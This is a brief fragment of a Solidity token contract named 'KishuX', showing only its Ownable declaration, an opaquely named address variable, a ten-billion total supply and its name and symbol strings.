...
contract KishuXTOKEN is Ownable {
    address public csbznf17;
    uint256 supplyamount = 10000000000*10**decimals();
    uint256 private _cctotalSupply = supplyamount;
    string private _cctokenname = "KishuX";
    string private _cctokensymbol = "KishuX";
